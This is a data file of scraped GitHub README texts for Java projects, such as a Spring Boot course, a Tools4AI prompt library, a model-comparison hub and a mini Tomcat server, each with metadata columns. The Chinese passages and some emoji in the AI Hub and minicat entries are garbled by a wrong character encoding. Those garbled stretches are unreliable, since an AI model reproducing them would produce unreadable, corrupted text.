 jsonString = builder.transformIntoJson(jsonString,prompt,""player"",""get player details"");
 log.info(jsonString);
```

The result will be 

```
""{\""lastName\"":\""Tendulkar\"",\""firstName\"":\""Sachin\""}""; 
```
You can extract custom parameters from the prompt or can convert the entire prompt into JSON

### Convert Prompt to XML
Once you have the JSON you can convert the JSON into XML

```
JSONObject jsonObject = new JSONObject(jsonNode.toString());
String xmlString = XML.toString(jsonObject); 
```

### Break Prompt into Multiple Subprompts and take action

You can have a really long prompt with multiple actions , those prompts will be broken down in multiple subprompts
``` 
@Log
public class ActionExample {
    public static void main(String[] args) throws AIProcessingException {
        ActionProcessor processor = new ActionProcessor();
        String multiPrmpt = ""hey I am in Toronto do you think i can go out without jacket,"" +
                "" also save the weather information , City location and your suggestion in file, "" +
                ""also include places to see"";
        String processed = processor.processMultipleActionDynamically
                (multiPrmpt, 
                        new LoggingHumanDecision(),
                        new LogginggExplainDecision());
        log.info(processed);
    }
}
```
Tools4AI will create a JSon from the prompt

```
{
  ""prmpt"": [
    {
      ""id"": ""1"",
      ""subprompt"": ""What is the weather in Toronto?"",
      ""depend_on"": null
    },
    {
      ""id"": ""2"",
      ""subprompt"": ""Do I need a jacket in this weather?"",
      ""depend_on"": ""1""
    },
    {
      ""id"": ""3"",
      ""subprompt"": ""Save the weather information, city location, and suggestion in a file."",
      ""depend_on"": ""2""
    },
    {
      ""id"": ""4"",
      ""subprompt"": ""Suggest some places to see in Toronto."",
      ""depend_on"": ""3""
    }
  ]
}

```
After that each Subprompt will be processd independently or in dependency order, if the prompts are dependent on each other
then the result from previous prompt will be fed into the next one.



## Java Doc
https://javadoc.io/doc/io.github.vishalmysore/tools4ai/latest/com/t4a/api/AIAction.html

## MVN Dependency

https://repo1.maven.org/maven2/io/github/vishalmysore/tools4ai/",0,1,1,0.0,"['simple', 'action', 'model', 'sam', 'feature', 'article', 'setup', 'action', 'processor', 'image', 'processing', 'action', 'autonomous', 'agent', 'action', 'script', 'prompt', 'transformer', 'convert', 'prompt', 'simple', 'pojo', 'convert', 'prompt', 'complex', 'pojo', 'convert', 'prompt', 'custom', 'gson', 'convert', 'prompt', 'json', 'string', 'convert', 'prompt', 'xml', 'break', 'prompt', 'multiple', 'subprompts', 'take', 'action', 'java', 'doc', 'mvn', 'dependency']","['prompt', 'action', 'convert', 'simple', 'pojo']",1.0,"[maven-assembly-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.codehaus.mojo:exec-maven-plugin]",0.0,1.0,0.0
danvega/fcc-spring-boot-3,main,"# Building web applications in Java with Spring Boot 3

This course is a beginner's step-by-step guide to developing web applications using Spring Boot, the most popular framework for building Java applications. You'll learn about Spring Boot 3 and its role in enabling developers to deliver enterprise-grade applications. We'll dive into Spring's fundamentals by creating a REST API that communicates with a database and is supported by a comprehensive suite of tests. By the end of this course you will have learned what you need to start building your own web applications with Spring Boot 3.

## Agenda

- Module 1: Course Introduction
  - Who am I?
  - Outcomes
  - Prerequisites
  - What is Spring?
- Module 2: Create the project
    - [start.spring.io](http://start.spring.io)
        - Java Build Tools (Maven + Gradle)
    - How to organize your code
        - Where your code should go (create a simple class)
        - No default package
    - How to run your application (IDE/Maven/Command Line)
    - Model
      - Run + Location Class
      - Records
    - Logging
    - Spring Boot DevTools
- Module 3: Web Application (REST API)
    - [Spring MVC](https://docs.spring.io/spring-framework/reference/web.html)
    - CRUD (in-memory)
    - @Component / Controller / RestController / Service / Repository
    - REST API Testing
        - Postman
        - Http Client (IntelliJ)
        - curl / HTTPie
    - Dependency Injection
    - Data Validation
    - Configuration
    - Error Handling
- Module 4: Database
    - H2 Database
    - JDBC Client (Keep it simple)
    - Command Line Runner
      - Loading JSON data
    - Docker Compose & PostgreSQL
    - Spring Data
- Module 5: REST Client
  - What is a client
    - Rest Template
    - WebClient
    - GraphQL Client
    - Rest Client
    - Http Interfaces
- Module 6: Testing
    - Spring Boot Testing Toolkit
      - No need to opt in to testing 
      - `contextLoads()` test
      - `@SpringBootTest` annotation
      - Documentation 
    - Writing Tests
      - `InMemoryRunRepositoryTest`
      - `RunControllerTest`
      - `RunControllerIntTest`
    - Spring Boot Slice Tests
      - `JDBCRunRepositoryTest`
    - Spring Rest Client Test
      - `UserRestClientTest`
- Resources

## Who am I?

- Husband + Father (2 daughters) #girldad 
- Cleveland, OH
- Spring Developer Advocate @Broadcom
- Java Champion
- Spring Academy Instructor
- 23+ years of Software Development Experience

## Prerequisites

- Java Fundamentals (Beginner - Intermediate)
- JDK 17+
  - Check current version `java --version`
  - [SDKMAN](https://sdkman.io/)
- Java Build Tools (Maven / Gradle)
- IDE / Text Editor
  - [IntelliJ IDEA](https://www.jetbrains.com/idea/) 
  - [Spring Tools](https://spring.io/tools)
    - Visual Studio Code
    - Eclipse
- API Testing Tool
  - Postman
  - Http Client (IntelliJ)
  - cURL / HTTPie
- [Docker Desktop](https://www.docker.com/)

## Outcomes

- ""Learn Spring""
  - What Spring is and what it can do
  - How to build a web application with Spring Boot
  - How to test a Spring Boot application
  - How to use Spring Data to interact with a database
- What are you going to build? 
  - A fitness application that allows you to track runs through a REST API

The important part here is to take what you learn and apply it to your own projects.

## What is Spring?

- [What / Why Spring?](https://spring.io/)

## Resources

This is a list of resources I recommend you check out to continue your learning.

### Dan Vega
  - [Website](https://www.danvega.dev/)
  - [YouTube](https://www.youtube.com/@danvega)
  - [Twitter](https://twitter.com/therealdanvega)

### Spring
  - [Spring Academy](https://www.youtube.com/c/SpringAcademy)
  - [Spring I/O](https://spring.io/blog)
  - [Spring Blog](https://spring.io/blog)
  - [SpringOne at VMware Explore](https://springone.io/) 

### Documentation

- [Spring Framework Reference](https://docs.spring.io/spring-framework/docs/current/reference/html/)
- [Spring Framework API](https://docs.spring.io/spring-framework/docs/current/javadoc-api/)
- [Spring Boot Reference](https://docs.spring.io/spring-boot/docs/current/reference/html/index.html)
- [Spring Boot API](https://docs.spring.io/spring-boot/docs/current/api/)
- [Spring Boot Guides](https://spring.io/guides)

### Books

- [Spring Boot Up and Running - Mark Heckler](https://amzn.to/3WOSutb)
- [Learning Spring Boot 3.0 - Greg Turnquist](https://amzn.to/3CuCgxc)
- [Spring Boot in Action - Craig Walls](https://amzn.to/3ZcI3kx)

### Podcasts

- [Bootiful Podcast - Josh Long](http://bootifulpodcast.fm/)
- [Spring Office Hours](https://www.springofficehours.io)

### YouTube

- [Spring Developer](https://www.youtube.com/@SpringSourceDev)
- [Josh Long](https://www.youtube.com/@coffeesoftware)
- [DaShaun Carter](https://www.youtube.com/@dashaun)
- [Spring Boot Learning](https://www.youtube.com/@SpringBootLearning)
- [Spring Tips](https://www.youtube.com/playlist?list=PLgGXSWYM2FpPw8rV0tZoMiJYSCiLhPnOc)
- [Amigoscode](https://www.youtube.com/@amigoscode)
- [Java Brains](https://www.youtube.com/c/JavaBrainsChannel)
- [Daily Code Buffer](https://www.youtube.com/@DailyCodeBuffer)
",0,1,1,0.0,"['build', 'web', 'application', 'java', 'spring', 'boot', 'agenda', 'who', 'i', 'prerequisite', 'outcome', 'what', 'spring', 'resource', 'dan', 'vega', 'spring', 'documentation', 'book', 'podcasts', 'youtube']","['spring', 'build', 'web', 'application', 'java']",1.0,[org.springframework.boot:spring-boot-maven-plugin],0.0,1.0,0.0
SemyonSinchenko/spark-connect-example,master,"# An example of extending SparkConnect Protocol
[Link to the blog post](https://semyonsinchenko.github.io/ssinchenko/post/extending-spark-connect/)

## Introduction

This project is written to work with a fresh (March, 2024) version of Apache Spark: 4.0.0-SNAPSHOT. There are a lot of reasons for it, it is detailed described inside a blog-post. It is hardly recommended to follow the blog-post text.

## Experiment desing

This repository and the corresponding blog-post is trying to cover the topic of migration of PySpark extensions based on `py4j` to a ""new spark"" with decoupled architecture. Inside the code there is an answer to the question how to interact with JVM classes and objects from Python via SparkConnect protocol.

## Structure

There are four main parts:

1. A JVM library we are trying to call from PySpark via gRPC: [link](https://github.com/SemyonSinchenko/spark-connect-example/tree/master/src/main/java/com/ssinchenko/example/lib);
2. A server-side plugins for SparkConnect written in Java: [linl](https://github.com/SemyonSinchenko/spark-connect-example/tree/master/src/main/java/com/ssinchenko/example/server);
3. A protobuf messages definition: [link](https://github.com/SemyonSinchenko/spark-connect-example/tree/master/src/main/protobuf)
4. A PySpark client part: [link](https://github.com/SemyonSinchenko/spark-connect-example/tree/master/src/main/python)

## Future plans

I will try to improve this `README.md` file, also I'm going to clean the code a little.
",0,1,1,0.0,"['an', 'example', 'extend', 'sparkconnect', 'protocol', 'introduction', 'experiment', 'desing', 'structure', 'future', 'plan']","['an', 'example', 'extend', 'sparkconnect', 'protocol']",1.0,[org.apache.maven.plugins:maven-surefire-plugin],0.0,1.0,0.0
Tvenus/blockchain,master,"# blockchain
Code your own blockchain in less than 120 lines of Java!

> added the real peer to peer network at 2018-06-15
",0,0,1,0.0,['blockchain'],['blockchain'],1.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-shade-plugin]",0.0,1.0,0.0
sameh-tarek/Fawry-Internship,main,"# Fawry Full Stack Engineering Internship

<details>
  <summary>Click to view Fawry image</summary>
  
  ![Fawry](https://github.com/user-attachments/assets/0c4189f6-cdea-4a4f-984a-90a2520f661c)
  
</details>


## About 

This repository serves as a record of the resources and tasks I'm working on during my internship at [Fawry](https://www.fawry.com/). My focus is on mastering full-stack development using **Spring Boot** and **Angular**. By documenting my learning journey, I hope to keep things organized and make it easier for others to access valuable knowledge. I believe that the content shared here will benefit anyone interested in full-stack development and contribute to the broader learning community.

## Table of Contents

| Week         | Content                                              |
|--------------|------------------------------------------------------|
| 01           | [Week 01](./Week01#readme)                           |
| 02           | [Week 02](./Week02#readme)                           |
| 03           | [Week 03](./Week03#readme)                           |
| 04           | [Week 04](./Week04#readme)                           |
| 05           | [Week 05](./Week05#readme)                           |
| 06           | [Week 06](./Week06#readme)                           |
| Final Project| [Final Project](https://github.com/Fawry-Internship)  |

## Exploration Tips
- Explore the weekly sections to find detailed insights and resources for each phase of the internship. ğŸ•µï¸â€â™‚ï¸
- The resources shared include articles, videos, and documentation that I personally found useful for learning full-stack development. ğŸ“š


<details>
  <summary>Some Memorable pictures</summary>
  
  ![IMG-20240419-WA0031](https://github.com/user-attachments/assets/d4c6f53f-c781-4557-b2a2-b681dab0a01c)
  ![1714424120186](https://github.com/user-attachments/assets/4320e0df-a27b-4c0a-bc6c-dc53ce23e0de)

</details>
",0,0,2,4.0,"['fawry', 'full', 'stack', 'engineering', 'internship', 'about', 'table', 'content', 'exploration', 'tip']","['fawry', 'full', 'stack', 'engineering', 'internship']",4.0,[],0.0,4.0,0.0
MuleSoft-AI-Chain-Project/mulesoft-ai-chain-connector,master,"
# MuleSoft AI Chain Connector


## <img src=""icon/icon.svg"" width=""6%"" alt=""banner"">   [MuleSoft AI Chain Connector](https://mac-project.ai/docs/mulechain-ai)

MuleSoft AI Chain is a MuleSoft custom connector (ğ˜£ğ˜¢ğ˜´ğ˜¦ğ˜¥ on ğ˜“ğ˜¢ğ˜¯ğ˜¨ğ˜Šğ˜©ğ˜¢ğ˜ªğ˜¯4ğ˜«) to provide a complete framework for MuleSoft users to design, build, and manage the lifecycle of AI Agents fully in the Anypoint Platform. It is part of the MuleSoft AI Chain Project (aka MAC Project) with the overall goal to provide capabilities, examples, etc. for MuleSoft Developers.

### Requirements

- The maximum supported version for Java SDK is JDK 17. You can use JDK 17 only for running your application.
- Compilation with Java SDK must be done with JDK 8.

### Installation

To use this connector, add the following dependency to your application's `pom.xml`:

```xml
<dependency>
   <groupId>com.mule.mulechain</groupId>
   <artifactId>mulechain-ai-connector</artifactId>
   <version>{version}</version>
   <classifier>mule-plugin</classifier>
</dependency>
```

### Documentation
- Check out the complete documentation on [mac-project.ai](https://mac-project.ai/docs/mulechain-ai).
- Learn from the [Getting Started YouTube Playlist](https://www.youtube.com/playlist?list=PLnuJGpEBF6ZAV1JfID1SRKN6OmGORvgv6)

---

### Stay tuned!

- ğŸŒ **Website**: [mac-project.ai](https://mac-project.ai)
- ğŸ“º **YouTube**: [@MuleSoft-MAC-Project](https://www.youtube.com/@MuleSoft-MAC-Project)
- ğŸ’¼ **LinkedIn**: [MAC Project Group](https://lnkd.in/gW3eZrbF)
",3,2,22,43.0,"['mulesoft', 'ai', 'chain', 'connector', 'img', 'banner', 'mulesoft', 'ai', 'chain', 'connector', 'http', 'requirement', 'installation', 'documentation', 'stay', 'tune']","['mulesoft', 'ai', 'chain', 'connector', 'img']",3.0,"[com.mulesoft.munit:munit-extensions-maven-plugin,net.revelc.code.formatter:formatter-maven-plugin,org.apache.maven.plugins:maven-clean-plugin,org.apache.maven.plugins:maven-jdeps-plugin,org.jacoco:jacoco-maven-plugin,org.mule.tools.maven:mule-maven-plugin]",0.0,0.0,0.0
hssy252/sky,master,"# Learning of sky take-out
You may know the training company **itheima**(it's hard to leave a comment) 
and the project is called a must for Java backend developer to learn(I guess is especially for the **new hand**)

## Features 
I made some **improvement** based on the raw project,which mainly exists in **Mappers**  (For example, I optimized some sql query from O(n) to O(1)).

And you may browse the **commits history** to better know the different modules of this project and the detailed process when building it.

### mapper
If you felt confused when watching the operation in the video that the teacher traversed some lists to do sql query(`IO!`) every iteration,you'll find the improvements in my code.
I used batched operation with `in` keyword in mysql to avoid the behavior mentioned above in the video,especially when the lecturer iterated the id list to send many sql query.Instead,I choosed to send the list as parameter so as to just query once.
And at the end of the course(the module of report),the lecturer still iterated the list to do sql query by date.I used the <foreach><foreach/> to union all query with one io cast.
",0,0,1,0.0,"['learn', 'sky', 'feature', 'mapper']","['learn', 'sky', 'feature', 'mapper']",4.0,[org.springframework.boot:spring-boot-maven-plugin],0.0,3.0,1.0
xielong/ai-hub,main,"# AI Hub Project

## ç®€ä»‹

AI Hubæ—¨åœ¨æŒç»­æµ‹è¯•å’Œè¯„ä¼°ä¸»æµå¤§å‹è¯­è¨€æ¨¡å‹ï¼ŒåŒæ—¶ç§¯ç´¯å’Œç®¡ç†å„ç§æœ‰æ•ˆçš„æ¨¡å‹è°ƒç”¨æç¤ºï¼ˆpromptï¼‰ã€‚ç›®å‰ï¼ŒAI Hubå·²æ¥å…¥å›½å†…æ‰€æœ‰ä¸»æµçš„å¤§å‹è¯­è¨€æ¨¡å‹ï¼ŒåŒ…æ‹¬æ–‡å¿ƒä¸€è¨€ã€è…¾è®¯æ··å…ƒã€æ™ºè°±AIã€MiniMaxã€ç™¾å·æ™ºèƒ½ç­‰ï¼Œå¹¶è®¡åˆ’æŒç»­è¿½è¸ªã€æ¥å…¥å’Œè¯„ä¼°æ–°æ¨¡å‹ã€‚

å·²æ”¯æŒæ¨¡å‹åˆ—è¡¨ï¼š
1. OpenAI / gpt-4-turbo
2. OpenAI / gpt-3.5-turbo
3. Baidu / ERNIE-Bot-4ï¼ˆæ–‡å¿ƒä¸€è¨€4ï¼‰
4. Baidu / ERNIE-Bot-turboï¼ˆæ–‡å¿ƒä¸€è¨€ï¼‰
5. Zhipu / glm-4ï¼ˆæ™ºè°±GLM-4ï¼‰
6. Zhipu / chatGLM_turboï¼ˆæ™ºè°±chatGLMï¼‰
7. Ali / qwen-plusï¼ˆé€šä¹‰åƒé—®plusï¼‰
8. Ali / qwen-turboï¼ˆé€šä¹‰åƒé—®ï¼‰
9. Tencent / ChatProï¼ˆè…¾è®¯æ··å…ƒï¼‰
10. Tencent / ChatStdï¼ˆè…¾è®¯æ··å…ƒï¼‰
11. Tencent / hunyuan-liteï¼ˆè…¾è®¯æ··å…ƒ)
12. Baichuan / Baichuan2-Turboï¼ˆç™¾å·ï¼‰
13. Minimax / abab5.5-chatï¼ˆMiniMaxï¼‰
14. Minimax / abab6-chatï¼ˆMiniMaxï¼‰
15. Xunfei / Spark3.1ï¼ˆè®¯é£æ˜Ÿç«ï¼‰
16. Moonshot / moonshot-v1-8k (æœˆä¹‹æš—é¢)
17. Xunfei / Spark3.5 (è®¯é£æ˜Ÿç«3.5)
18. ByteDance / Skylark-chat (å­—èŠ‚è±†åŒ…)
19. Lingyi / yi-34b-chat-0205 (é›¶ä¸€ä¸‡ç‰©)
20. Lingyi / yi-34b-chat-200k (é›¶ä¸€ä¸‡ç‰©)
21. Lingyi / yi-vl-plus (é›¶ä¸€ä¸‡ç‰©)
22. Deepseek / DeepSeek-V2 (Deepseek)
23. Baidu / ERNIE-Lite-8Kï¼ˆæ–‡å¿ƒä¸€è¨€ï¼‰
24. Baidu / ERNIE-Speed-8Kï¼ˆæ–‡å¿ƒä¸€è¨€ï¼‰
25. Xunfei / Spark-Liteï¼ˆè®¯é£æ˜Ÿç«ï¼‰

åœ¨ [å¤§æ¨¡å‹åˆ—è¡¨](#å¤§æ¨¡å‹åˆ—è¡¨) éƒ¨åˆ†ï¼Œæœ‰æ›´å®Œæ•´çš„å¤§è¯­è¨€æ¨¡å‹åˆ—è¡¨ã€‚è¯·æ³¨æ„ï¼Œå…¶ä¸­çš„ä¸€äº›å¤§è¯­è¨€æ¨¡å‹å°šæœªç»è¿‡è¯„ä¼°ï¼Œæˆ‘å°†é™†ç»­å¯¹è¿™äº›æ¨¡å‹è¿›è¡Œè¯„ä¼°ã€‚


![chat-demo](assets/chat-demo.png)

ä½¿ç”¨å‰è¯·åœ¨ Settings é¡µé¢è®¾ç½®æ¨¡å‹çš„ credentialsï¼š
![settings](assets/settings.png)

## è¯„ä¼°ç»“æœ
### è‹±æ–‡ç¿»è¯‘
[æµ‹è¯•ç”¨ä¾‹çœ‹è¿™é‡Œ](docs/use_cases/translation/)
![è‹±æ–‡ç¿»è¯‘](assets/assess_translation.png)

### ç¼–ç¨‹
[æµ‹è¯•ç”¨ä¾‹çœ‹è¿™é‡Œ](docs/use_cases/coding/)
![è‹±æ–‡ç¿»è¯‘](assets/assess_coding.png)

### æŒ‡ä»¤è¾“å‡º
[æµ‹è¯•ç”¨ä¾‹çœ‹è¿™é‡Œ](docs/use_cases/instruction/)
![è‹±æ–‡ç¿»è¯‘](assets/assess_instruction.png)


## å¤§æ¨¡å‹æ¥å…¥
å¦‚æœä½ æƒ³è‡ªå·±æ¥å…¥åˆ—è¡¨ä¸­çš„å¤§æ¨¡å‹ï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼ã€‚
### Rest æœåŠ¡
å¯åŠ¨ ai-hub-serverï¼Œè®¿é—®
```http
http://127.0.0.1:3000/api/v1/models/${provider}/${model}:chat
```
Post:
```json
{
    ""input"": ""${input}""
}
```
### Java ä»£ç æ¥å…¥
å¯ä»¥å‚è€ƒ[è¿™é‡Œ](ai-hub-server/src/main/java/com/github/xielong/aihub/adapter)
```java
@Service
public class AIModelInvokerFactory {

    private final ApplicationContext context;

    @Autowired
    public AIModelInvokerFactory(ApplicationContext context) {
        this.context = context;
    }

    public AIModelInvoker getProviderAdapter(String providerName) {
        AIProvider provider = AIProvider.fromName(providerName);

        switch (provider) {
            case OPENAI:
                return context.getBean(OpenAIInvoker.class);
            case BAICHUAN:
                return context.getBean(BaichuanInvoker.class);
            case ALI:
                return context.getBean(AliInvoker.class);
            case BAIDU:
                return context.getBean(BaiduInvoker.class);
            case ZHIPU:
                return context.getBean(ZhipuInvoker.class);
            case TENCENT:
                return context.getBean(TencentInvoker.class);
            case XUNFEI:
                return context.getBean(XunfeiInvoker.class);
            case MINIMAX:
                return context.getBean(MiniMaxInvoker.class);
            default:
                throw new IllegalArgumentException(""Unknown provider: "" + provider);
        }
    }

}

```

## è¿è¡Œ

### Docker
æ¨èä½¿ç”¨ docker-compose å¯åŠ¨æœåŠ¡
```shell
cd docker
docker-compose up -d
```

### æ•°æ®åº“
å‚è€ƒ[è„šæœ¬](docker/init-db/init.sql)

### å‰ç«¯
```shell
cd ai-hub-fe
npm run start
```

### æœåŠ¡ç«¯
éœ€è¦ JDK 11 ä»¥ä¸Šç‰ˆæœ¬
```shell
cd ai-hub-server
mvn clean package
java -jar ai-hub-server-1.0.0-SNAPSHOT-exec.jar
```

## æµ‹è¯•é›†

### [ç¿»è¯‘](docs/use_cases/translation/)
### [ç¼–ç¨‹](docs/use_cases/coding/)
### z-bench æµ‹è¯•é›†

## å¤§æ¨¡å‹åˆ—è¡¨

### ä½æˆæœ¬æ¨¡å‹

| Company   | Model          | Price(1M tokens)    | Context Length |
|-----------|----------------|---------------------|----------------|
| Baidu     | ERNIE Speed    | å…è´¹                | 8k             |
| Baidu     | ERNIE Lite     | å…è´¹                | 8k             |
| Tencent   | hunyuan-lite   | å…è´¹                | 256k           |
| ByteDance | Doubao-lite    | Input: 0.3 \| Output: 0.6 | 32k     |
| Zhipu     | GLM-3-Turbo    | 1                   | 128k           |
| Lingyi    | yi-spark       | 1                   | 16k            |
| Ali       | qwen-long      | Input: 0.5 \| Output: 2 | 10m      |
| ByteDance | Doubao-pro     | Input: 0.8 \| Output: 2 | 32k     |
| DeepSeek  | deepseek-chat  | Input: 1 \| Output: 2  | 32k     |
| Lingyi    | yi-medium      | 2.5                 | 16k            |

### ä¸­ä½æˆæœ¬æ¨¡å‹

| Company   | Model          | Price(1M tokens)    | Context Length |
|-----------|----------------|---------------------|----------------|
| Ali       | qwen-turbo     | Input: 2 \| Output: 6  | 8k          |
| Tencent   | hunyuan-standard | Input: 4.5 \| Output: 5 | 32k    |
| MiniMax   | abab5.5s       | 5                   | 8k             |
| OpenAI    | GPT-3.5 Turbo  | Input: $0.50 \| Output: $1.50 | 16k |
| ByteDance | Doubao-pro-128k | Input: 5 \| Output: 9 | 128k   |
| Baichuan  | Baichuan2-Turbo | 8                  | 32k            |
| MiniMax   | abab6.5s       | 10                  | 245k           |
| Ali       | qwen-plus      | Input: 4 \| Output: 12 | 32k     |
| Baidu     | ERNIE 3.0      | 12                  | 8k             |
| Baichuan  | Baichuan3-Turbo | 12                 | 32k            |
| Lingyi    | yi-large-turbo | 12                  | 16k            |
| Lingyi    | yi-medium-200k | 12                  | 200k           |
| Moonshot  | moonshot-v1-8k | 12                  | 8k             |

### ä¸­é«˜æˆæœ¬æ¨¡å‹

| Company   | Model              | Price(1M tokens)    | Context Length |
|-----------|--------------------|---------------------|----------------|
| Moonshot  | moonshot-v1-32k    | 24                  | 32k            |
| Baichuan  | Baichuan3-Turbo-128k | 24                | 128k           |
| MiniMax   | abab6.5            | 30                  | 8k             |
| Tencent   | hunyuan-standard-256k | Input: 15 \| Output: 60 | 256k |
| Moonshot  | moonshot-v1-128k   | 60                  | 128k           |

### é«˜æˆæœ¬æ¨¡å‹

| Company   | Model              | Price(1M tokens)    | Context Length |
|-----------|--------------------|---------------------|----------------|
| OpenAI    | GPT-4o             | Input: $5 \| Output: $15 | 128k     |
| Baidu     | ERNIE-3.5-128k     | Input: 48 \| Output: 96 | 128k     |
| Tencent   | hunyuan-pro        | Input: 30 \| Output: 100 | 32k     |
| Ali       | qwen-max           | Input: 40 \| Output: 120 | 8k      |
| Zhipu     | GLM-4              | 100                 | 128k           |
| Baichuan  | Baichuan4          | 100                 | 32k            |
| Baidu     | ERNIE 4.0          | 120                 | 8k             |",0,1,1,0.0,"['ai', 'hub', 'project', 'rest', 'java', 'docker']","['ai', 'hub', 'project', 'rest', 'java']",1.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-resources-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,1.0,0.0
guybedo/sugar,master,"Sugar
===================

Sugar for Java


What is this?
--------------

Sugar is a small utils library providing static functions to write less verbose Java code. 

Nothing groundbreaking here, just some sugar.

Features:
- Create/Manipulate collections: set, list, map, partition, product, intersect, counts, sums
- Collection helpers: first, last, sorted, max, min, mean, sum, prepend, append, concat, zip
- Random: random string, random char, choose elements in collection
- Parallel: pEach, pMap


# Examples

## Collections
```Java
Map<String, String> newMap = map(kv(""key1"", ""value1""), kv(""key1"", ""value1""), kv(""key1"", ""value1""));

List<Integer> values = list(1,2,3,4);
Integer min = min(values);
Integer last = last(values);
Integer one = first(filter(values,v -> v == 1));
values = map(values, v -> v + 1);

Map<Profile, Integer> counts = counts(objects, o -> o.getProfile());

```

## POJOs
```Java
orElse(""test"", s -> s + ""_ok"", null);
ifPresent(""test"", s -> System.out.println(s));
isoDateTime(LocalDateTime.now());
```


Getting Started
---------------

Maven
-----

```xml
<dependency>
    <groupId>com.akalea</groupId>
    <artifactId>sugar</artifactId>
    <version>0.0.10</version>
</dependency>
```

Import functions
----------------

```Java
import static com.akalea.sugar.Collections.*;
import static com.akalea.sugar.Pojos.*;
```
",0,0,2,1.0,"['example', 'collection', 'pojos']","['example', 'collection', 'pojos']",1.0,"[maven-clean-plugin,maven-compiler-plugin,maven-jar-plugin,maven-resources-plugin,maven-surefire-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-source-plugin,org.sonatype.central:central-publishing-maven-plugin]",0.0,1.0,0.0
houbb/minicat,master,"# é¡¹ç›®ç®€ä»‹

```
 /\_/\  
( o.o ) 
 > ^ <
```

mini-cat æ˜¯ç®€æ˜“ç‰ˆæœ¬çš„ tomcat å®ç°ã€‚åˆ«ç§°ã€å—…è™ã€‘(å¿ƒæœ‰çŒ›è™ï¼Œè½»å—…è”·è–‡ã€‚)

[![Maven Central](https://maven-badges.herokuapp.com/maven-central/com.github.houbb/minicat/badge.svg)](http://mvnrepository.com/artifact/com.github.houbb/minicat)
[![Build Status](https://www.travis-ci.org/houbb/minicat.svg?branch=master)](https://www.travis-ci.org/houbb/minicat?branch=master)
[![Coverage Status](https://coveralls.io/repos/github/houbb/minicat/badge.svg?branch=master)](https://coveralls.io/github/houbb/minicat?branch=master)

# ç‰¹æ€§

- ç®€å•çš„å¯åŠ¨å®ç°/netty æ”¯æŒ

- servlet æ”¯æŒ

- é™æ€ç½‘é¡µæ”¯æŒ

- filter/listener æ”¯æŒ

- wars æ”¯æŒ

# å˜æ›´æ—¥å¿—

> [å˜æ›´æ—¥å¿—](CHANGE_LOG.md)

# å¿«é€Ÿå¼€å§‹

## maven ä¾èµ–

```xml
<dependency>
    <groupId>com.github.houbb</groupId>
    <artifactId>minicat</artifactId>
    <version>0.7.0</version>
</dependency>
```

## å¯åŠ¨æµ‹è¯•

è¿è¡Œæµ‹è¯•ç±» `MiniCatBootstrapMain#main`

```java
MiniCatBootstrap bootstrap = new MiniCatBootstrap();
bootstrap.start();
```

å¯åŠ¨æ—¥å¿—ï¼š

```
[INFO] [2024-04-03 11:09:15.178] [main] [c.g.h.m.s.s.WebXmlServletManager.register] - [MiniCat] register servlet, url=/my, servlet=com.github.houbb.minicat.support.servlet.MyMiniCatHttpServlet
[INFO] [2024-04-03 11:09:15.180] [Thread-0] [c.g.h.m.b.MiniCatBootstrap.startSync] - [MiniCat] start listen on port 8080
[INFO] [2024-04-03 11:09:15.180] [Thread-0] [c.g.h.m.b.MiniCatBootstrap.startSync] - [MiniCat] visit url http://127.0.0.1:8080
```

é¡µé¢è®¿é—®ï¼š[http://127.0.0.1:8080](http://127.0.0.1:8080)

å“åº”ï¼š

```
http://127.0.0.1:8080
```

## æµ‹è¯•

servlet: http://127.0.0.1:8080/my

html: http://127.0.0.1:8080/index.html

# ç³»åˆ—æ•™ç¨‹

[ä»é›¶æ‰‹å†™å®ç° apache Tomcat-01-å…¥é—¨ä»‹ç»](https://houbb.github.io/2016/11/07/web-server-tomcat-02-hand-write-overview)

[ä»é›¶æ‰‹å†™å®ç° apache Tomcat-02-web.xml å…¥é—¨è¯¦ç»†ä»‹ç»](https://houbb.github.io/2016/11/07/web-server-tomcat-02-hand-write-web-xml)

[ä»é›¶æ‰‹å†™å®ç° tomcat-03-åŸºæœ¬çš„ socket å®ç°](https://houbb.github.io/2016/11/07/web-server-tomcat-03-hand-write-simple-socket)

[ä»é›¶æ‰‹å†™å®ç° tomcat-04-è¯·æ±‚å’Œå“åº”çš„æŠ½è±¡](https://houbb.github.io/2016/11/07/web-server-tomcat-04-hand-write-request-and-resp)

[ä»é›¶æ‰‹å†™å®ç° tomcat-05-servlet å¤„ç†æ”¯æŒ](https://houbb.github.io/2016/11/07/web-server-tomcat-05-hand-write-servlet-web-xml)

[ä»é›¶æ‰‹å†™å®ç° tomcat-06-servlet bio/thread/nio/netty æ± åŒ–å¤„ç†](https://houbb.github.io/2016/11/07/web-server-tomcat-06-hand-write-thread-pool)

[ä»é›¶æ‰‹å†™å®ç° tomcat-07-war å¦‚ä½•è§£æå¤„ç†ä¸‰æ–¹çš„ war åŒ…ï¼Ÿ](https://houbb.github.io/2016/11/07/web-server-tomcat-07-hand-write-war)

[ä»é›¶æ‰‹å†™å®ç° tomcat-08-tomcat å¦‚ä½•ä¸ springboot é›†æˆï¼Ÿ](https://houbb.github.io/2016/11/07/web-server-tomcat-08-hand-write-embed)

[ä»é›¶æ‰‹å†™å®ç° tomcat-09-servlet å¤„ç†ç±»](https://houbb.github.io/2016/11/07/web-server-tomcat-09-hand-write-servlet)

[ä»é›¶æ‰‹å†™å®ç° tomcat-10-static resource é™æ€èµ„æºæ–‡ä»¶](https://houbb.github.io/2016/11/07/web-server-tomcat-10-hand-write-static-resource)

[ä»é›¶æ‰‹å†™å®ç° tomcat-11-filter è¿‡æ»¤å™¨](https://houbb.github.io/2016/11/07/web-server-tomcat-11-hand-write-filter)

[ä»é›¶æ‰‹å†™å®ç° tomcat-12-listener ç›‘å¬å™¨](https://houbb.github.io/2016/11/07/web-server-tomcat-12-hand-write-listener)


# ROAD-MAP

- [x] servlet æ ‡å‡†æ”¯æŒ
- [x] è¯·æ±‚çº¿ç¨‹æ± æ”¯æŒ
- [x] NIO å®ç°
- [x] netty å®ç°
- [x] åŠ è½½ war åŒ…
- [x] listener çš„å®ç°
- [] error/welcome é¡µé¢ï¼Ÿ
